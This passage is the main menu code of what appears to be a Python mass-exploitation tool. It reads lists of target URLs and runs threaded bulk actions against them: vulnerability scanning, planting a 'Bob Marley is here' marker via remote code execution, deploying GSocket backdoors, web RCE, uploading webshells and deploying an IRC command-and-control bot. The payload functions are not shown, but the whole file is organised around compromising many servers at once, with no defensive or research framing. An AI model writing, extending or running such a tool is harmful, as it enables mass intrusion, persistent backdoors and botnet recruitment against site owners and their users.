# ==================== MAIN ====================
def main():
    global VERBOSE, THREADS
    print(BANNER)
    print(f"{C}{'='*60}{RST}")
    print(f"{G}[1]{RST} Scan Vulnerability")
    print(f"{G}[2]{RST} Txt Marker RCE")
    print(f"{G}[3]{RST} RCE GSocket")
    print(f"{G}[4]{RST} RCE Web")
    print(f"{G}[5]{RST} Upload Webshell (Bob + Mage Control Panel)")
    print(f"{G}[6]{RST} Deploy IRC C2 Bot")
    print(f"{G}[7]{RST} Single Target RCE")
    print(f"{R}[0]{RST} Exit\n")
    
    choice = input(f"{C}[?]{RST} Select: ").strip()
    if choice == '0':
        return
    if choice not in ['1','2','3','4','5','6','7']:
        print(f"{R}[!]{RST} Invalid\n")
        return
    
    # Handle single target mode separately (no file needed)
    if choice == '7':
        single_target_mode()
        return
    
    target_file = input(f"{C}[?]{RST} Target file: ").strip()
    if not os.path.exists(target_file):
        print(f"{R}[!]{RST} File not found\n")
        return
    
    verbose_input = input(f"{C}[?]{RST} Verbose? (Y/n): ").strip().lower()
    VERBOSE = verbose_input != 'n'
    
    # Ask for thread count for bulk operations (Options 1-5)
    thread_input = input(f"{C}[?]{RST} Threads (10-50, default 10): ").strip()
    if thread_input:
        try:
            threads = int(thread_input)
            if 10 <= threads <= 50:
                THREADS = threads
            else:
                print(f"{Y}[!]{RST} Invalid range, using default (10)")
                THREADS = 10
        except:
            print(f"{Y}[!]{RST} Invalid input, using default (10)")
            THREADS = 10
    
    # Parse input file - support both plain URLs and Vulnerable.txt format
    targets = []
    vuln_data = {}  # Store path and report_id if available
    
    with open(target_file) as f:
        lines = f.readlines()
    
    # Check if it's Vulnerable.txt format (has "Target:", "Path:", "Report ID:")
    is_vuln_format = any("Target:" in line for line in lines[:20])
    
    if is_vuln_format:
        # Parse Vulnerable.txt format
        current_target = None
        for line in lines:
            line = line.strip()
            if line.startswith("Target:"):
                current_target = line.split("Target:")[1].strip()
                if current_target.startswith('http'):
                    targets.append(current_target)
                    vuln_data[current_target] = {}
            elif current_target and line.startswith("Path:"):
                vuln_data[current_target]['path'] = line.split("Path:")[1].strip()
            elif current_target and line.startswith("Report ID:"):
                vuln_data[current_target]['report_id'] = line.split("Report ID:")[1].strip()
        print(f"{G}[+]{RST} Loaded {len(targets)} targets from Vulnerable.txt format")
        if vuln_data:
            print(f"{C}[*]{RST} Using pre-discovered paths and report IDs")
    else:
        # Plain URL list
        targets = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
        targets = [t if t.startswith('http') else f'https://{t}' for t in targets]
        print(f"{G}[+]{RST} Loaded {len(targets)} targets")
    
    print(f"{C}[*]{RST} Using {THREADS} threads\n")
    
    if choice == '1':
        scan_mode(targets)
    elif choice == '2':
        marker = input(f"{C}[?]{RST} Marker (Bob Marley is here): ").strip() or "Bob Marley is here"
        marker_mode(targets, marker, vuln_data)
    elif choice == '3':
        confirm = input(f"{Y}[!]{RST} Deploy GSocket on all targets? (y/N): ").strip().lower()
        if confirm == 'y':
            gsocket_mode(targets, vuln_data)
    elif choice == '4':
        confirm = input(f"{Y}[!]{RST} Deploy Web RCE? (y/N): ").strip().lower()
        if confirm == 'y':
            rce_mode(targets, vuln_data)
    elif choice == '5':
        upload_webshell_mode(targets, vuln_data)
    elif choice == '6':
        irc_bot_mode(targets, vuln_data)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[*]{RST} Interrupted\n")
